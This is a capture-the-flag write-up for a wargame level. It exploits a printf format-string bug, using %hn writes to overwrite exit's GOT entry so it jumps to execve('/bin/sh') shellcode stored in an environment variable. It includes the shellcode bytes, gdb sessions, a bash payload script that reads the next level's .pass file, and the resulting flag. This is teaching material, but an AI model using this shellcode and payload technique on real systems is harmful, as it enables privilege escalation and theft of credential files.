# Level05 GOT hijacking and Format String

## Overview

The binary is a simple program that converts uppercase letters in the input to lowercase and then directly executes the string with `printf(s)`, allowing a **format string attack**. However, it terminates the program with exit(0), preventing us from redirecting the flow of the program by modifying the `EIP`. Instead, we need to overwrite the **Global Offset Table** `exit` address to point to a **shellcode** stored in an environment variable (`envp`).

### Main Function

```C
int main(int argc, const char **argv, const char **envp)
{
  char s[100];

  fgets(s, 100, stdin);
  for (int i = 0; i < strlen(s); ++i )
  {
    if ( s[i] >= 'A' && s[i] <= 'Z' )  // If uppercase letter
      s[i] ^= 0x20u;                   // Convert to lowercase
  }
  printf(s);
  exit(0);
}
```

## Payload

### Shellcode

We will use a simple shellcode to execute `execve("/bin/sh", NULL, NULL)`:
```C
execve("/bin/sh", NULL, NULL) = 
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
```
Exporting it as an environment variable, with a `NOP` (No Operation) padding.
```bash
export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
```

#### Address

To find the address of our shellcode, we open the program with `gdb` and search for it in the environment addresses.
```bash
(gdb) break main
Breakpoint 1 at 0x8048449
(gdb) run
Breakpoint 1, 0x08048449 in main ()
(gdb) x/200s environ 
...
0xffffd80b: "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220...
0xffffd8d3: "\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343̀"
...
```

The address of our *shellcode* is: `0xffffd8d3`.

### `exit` in the *Global Offset Table*

Next, we need the `exit` address inside the **GOT**.

```bash
(gdb) disassemble exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0   <========
             ^^^^^^
   ...
End of assembler dump.
```

The `exit` address in the **GOT** is `0x80497e0`.

### `printf` Arguments Offset

We need to find out in which position in the **stack** our input `buffer` is, to use it in our **format string attack**.

We use this input:
```
aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x
```

#### Breakpoint after `fgets`
We set a breakpoint after receiving the input to print the `buffer` in hexadecimal.
```bash
(gdb) set disassembly-flavor intel 
(gdb) disassemble main 
Dump of assembler code for function main:
    ...
    0x08048475 <+49>:	call   0x8048350 <fgets@plt>
    0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
    ...
(gdb) break *0x0804847a
Breakpoint 1 at 0x804847a
(gdb) run
Starting program: /home/users/level05/level05 
aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x

Breakpoint 1, 0x0804847a in main ()
```

##### Buffer in Hexadecimal
The buffer is stored in the `EAX` register.
```
(gdb) x/8xw $eax
0xffffd688:	0x61616161	0x20782520	0x25207825	0x78252078
0xffffd698:	0x20782520	0x25207825	0x78252078	0x20782520
```
##### Output for Comparison
```
(gdb) continue
Continuing.
aaaa 64 f7fcfac0 f7ec3b11 ffffd6af ffffd6ae 0 ffffffff ffffd734 0 [61616161 20782520 25207825 78252078]
```
Our input `buffer` is in the **10th** position in the stack.

### Payload Construction

#### Recapitulation

| Shellcode Address | Exit GOT Address |
|-------------------|------------------|
| `0xffffd8d3`      | `0x80497e0`      |
| `4294957267`      |                  |

Using the `%n` format specifier directly is impractical because it would require printing `4294957267` characters. We split this process into two steps (writing short by short with `%hn`).

```bash
0xffffd8d3 = ffff  & d8d3
0xffffd8d3 = 65535 & 55507
addr[2]    = 65535 , 55507
````

#### Splitting script
```bash
split_addr() {
    address="$1"
    half1="${address:0:4}"
    half2="${address:4}" 

    int1=$((0x$half1))
    int2=$((0x$half2))

    echo "$address splits into:"
    echo "$half1 -> $int1"
    echo "$half2 -> $int2"
    echo "n1 = $(($int2 - 8))"
    echo "n2 = $(($int1 - $int2))"
}

$ split_addr ffffd8d3
# Output:
# ffffd8d3 splits into:
# ffff -> 65535
# d8d3 -> 55507
# n1 = 55499
# n2 = 10028
```

#### Format String

```
<Exit GOT Address>
<Exit GOT Address + 2>
<addr[1] - 8>x%10$hn
<addr[0]-addr[1]>x%11$hn

0x80497e0 0x80497e2 (addr[1]-8)d%10$hn (addr[0]-addr[1])d%10$hn
```
#### Payload Script
To inject this payload, we modify our splitting script to use the obtained values.

```bash
payload() {
    address="$1"
    half1="${address:0:4}"
    half2="${address:4}" 

    int1=$((0x$half1))
    int2=$((0x$half2))

    n1=$(($int2 - 8))
    n2=$(($int1 - $int2))

    cat <(python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08%' + str($n1) + 'x%10\$hn%' + str($n2) + 'x%11\$hn'"; echo "cat /home/users/level06/.pass") - | ./level05
}
```

## Flag

```
payload ffffd8d3
...
f7fcfac0
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```